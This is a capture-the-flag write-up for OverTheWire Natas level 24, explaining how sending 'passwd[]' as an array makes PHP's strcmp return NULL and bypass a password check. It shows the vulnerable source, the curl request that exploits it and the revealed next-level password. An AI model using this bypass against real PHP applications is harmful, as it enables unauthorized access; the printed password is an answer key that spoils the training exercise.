# Natas Level 24 → 25

## Goal

The PHP uses `strcmp($_REQUEST["passwd"], "<real password>")` to check the password. In older PHP versions, calling `strcmp` with an **array** instead of a string returned `NULL`, and `NULL == 0` is true — so `strcmp(...) == 0` evaluates to true. Submit `passwd[]=anything` in the query string and the comparison "succeeds."

## Concepts you'll learn

- How PHP parses `name[]=x` into an array in `$_REQUEST`
- Why calling string functions on an array is a bug class (`strcmp`, `strlen`, `preg_match` all have variants of this issue in older PHP)
- Writing `curl` with repeated `name[]=` parameters

## Walkthrough

### 1. View the source

```php
if(array_key_exists("passwd", $_REQUEST)) {
    if(!strcmp($_REQUEST["passwd"], "<real password>")) {
        echo "The password for natas25 is <censored>";
    }
}
```

`!strcmp(x, y)` is "true if x equals y." But if `x` is an array, `strcmp` triggers a warning, returns `NULL`, and `!NULL` is `true`.

### 2. Pass an array

```bash
$ curl -u natas24:<pass> \
       "http://natas24.natas.labs.overthewire.org/index.php?passwd[]=x"
```

The `[]` suffix in the query string tells PHP to treat `passwd` as an array. `strcmp(array, string)` → `NULL`. The check passes:

```
The password for natas25 is GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

## The answer

The password for `natas25` is:

**`GHF6X7YwACaYYssHVY05cFq83hRktl4c`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas24.natas.labs.overthewire.org/>
